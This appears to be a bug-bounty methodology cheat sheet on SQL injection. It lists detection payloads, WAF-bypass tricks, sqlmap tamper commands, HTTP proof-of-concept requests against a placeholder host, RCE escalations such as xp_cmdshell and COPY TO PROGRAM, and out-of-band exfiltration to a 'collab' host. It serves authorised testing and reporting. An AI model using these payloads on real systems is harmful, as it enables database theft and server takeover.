# SQL Injection

**What it is:** User input reaches a SQL query unsanitized → read/modify DB, sometimes RCE.

## Where to look
Every param: URL query, POST body, JSON values, headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, `ORDER BY`/`LIMIT`, search, filters, JSON keys.

## Detection
- [ ] Error-based: `'`, `"`, `')`, `';`, backtick → DB error / 500 change.
- [ ] Boolean: `' AND 1=1-- -` vs `' AND 1=2-- -` → response differs.
- [ ] Time-based (blind): `' AND SLEEP(5)-- -`, `'||pg_sleep(5)--`, `WAITFOR DELAY '0:0:5'`.
- [ ] UNION: find column count (`ORDER BY n`), then `UNION SELECT ...`.
- [ ] OOB: DNS exfil via `LOAD_FILE`/`xp_dirtree`/`UTL_HTTP` to your Collaborator.

## Auth-context tip
Change `id=1001` to `1089` first (authz), then to `1001'` (SQLi). Do both — scanners chase the quote and miss the authz bug next door.

## Bypass filters
- Comments: `/**/`, `--+`, `#`, inline `/*!50000...*/`.
- Case/encoding: `UnIoN`, URL/double-URL/hex encode, whitespace `%09%0a%0c`.
- WAF: replace spaces with `/**/`, use `%0b`, nest keywords, use JSON operators (Postgres `->`).

## Exploit
`sqlmap -r req.txt --batch --risk 3 --level 5` — after manual confirm. Dump minimally (schema, one row) to prove.

## DB-specific tells
MySQL `@@version`, Postgres `version()`, MSSQL `@@version`+stacked queries+`xp_cmdshell`, Oracle `dual`, SQLite `sqlite_version()`.

## WAF parser-discrepancy bypass (2025)
The WAF and the DB driver tokenize differently. Exploit the gap:
- [ ] JSON-body SQLi where the WAF only inspects form/query params — move the injection into a JSON value.
- [ ] Multipart/`Content-Type` swap so the WAF misparses the body but the app still binds the param.
- [ ] Postgres/MySQL operator syntax the WAF rule misses: `->`, `->>`, `/*!50000UNION*/`, scientific-notation numeric context.
- [ ] Overlong/encoded whitespace (`%a0 %0b %0c`), comment nesting, and case the signature engine normalizes wrong.
Confirm reach to the **origin** too (`10-server-edge/04`) — if you bypass the CDN/WAF entirely, plain payloads land.

## Impact
Data breach, auth bypass, file read/write, RCE (stacked/`INTO OUTFILE`/`xp_cmdshell`).

## Tools
`sqlmap`, Burp, `ghauri`, `~/scripts/sqli_hunter.py` (anti-ban + FP reduction), Collaborator for OOB.

## 🎯 PoC — Request → Response

**Boolean-blind in a filter param (length differs):**
```http
GET /api/v2/products?category=phones' AND '1'='1 HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK
Content-Length: 15234        ← TRUE: full product list
```
```http
GET /api/v2/products?category=phones' AND '1'='2 HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK
Content-Length: 412          ← FALSE: empty list. Differential = injectable.
```
**UNION extraction (benign proof):**
```http
GET /api/v2/products?category=x' UNION SELECT @@version,current_user,3-- - HTTP/2
```
```http
HTTP/2 200 OK
{"items":[{"name":"8.0.36-MySQL","brand":"app_ro@10.0.0.5","price":3}]}
```

## Deep cuts — injection points & escalations hunters skip
- [ ] **No-quote contexts:** `ORDER BY`, `GROUP BY`, `LIMIT`, `OFFSET`, column/table names, and JSON-path args take **no string quotes** — inject `(CASE WHEN(1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)` or `1,(SELECT SLEEP(5))`. Most WAFs and devs only defend the `WHERE value` slot.
- [ ] **Second-order SQLi:** the value is stored safely, then concatenated unsafely by a *later* query (registration username → admin search, profile field → report). Plant `'`-bearing data, trigger the second query (`09-advanced/01`).
- [ ] **JSON operator injection (Postgres/MySQL):** `->`, `->>`, `#>>`, `@>` and `jsonb` paths bypass signature WAFs and reach nested query builders.
- [ ] **ORM leak / mass-filter:** Sequelize/Prisma/Django `__` operators (`?filter[role__contains]=`, `where[$gt]`) inject operators, not SQL, but read arbitrary rows.
- [ ] **RCE escalations by engine:** Postgres `COPY (…) TO PROGRAM 'cmd'` / `pg_read_file`; MySQL `INTO OUTFILE`/`LOAD_FILE` (needs `FILE` priv + `secure_file_priv`); MSSQL `xp_cmdshell`, `sp_OACreate`, linked-server `OPENQUERY`; Oracle `DBMS_SCHEDULER`/`UTL_HTTP`.
- [ ] **Timing when `SLEEP` is filtered:** heavy-query delays — `RLIKE` catastrophic regex, `BENCHMARK(5000000,MD5(1))`, `generate_series` (PG), self-join cross product, SQLite `RANDOMBLOB(1000000000/2)` (also a DoS vector — report-only).
- [ ] **Error-based fast-dump:** `EXTRACTVALUE`/`UPDATEXML` (MySQL), `CAST … ::int` type-error (PG), `CONVERT`/`@@version` in error (MSSQL) → data in the error string.
- [ ] **OAST OOB when fully blind:** MySQL (Windows) `LOAD_FILE('\\\\collab\\x')`, MSSQL `xp_dirtree '\\collab\x'`, PG `COPY…PROGRAM 'nslookup collab'`, Oracle `UTL_INADDR`/`UTL_HTTP`.
- [ ] **Auth-context sibling (repeat):** try the *valid other id* (authz) before the quote — scanners chase `'` and miss the BOLA next door (`01-access-control`).
- [ ] **sqlmap tamper for the WAF you fingerprinted:** `--tamper=between,charencode,space2comment,versionedmorekeywords`; set `--technique`, `--dbms`, and reach the **origin** to drop WAF entirely (`10-server-edge/04`).

## Report notes
Prove with a benign extraction (`@@version`, `current_user`). Never dump full tables. Show request + DB response. Name the technique (boolean/time/UNION/error/OOB) and the DBMS.
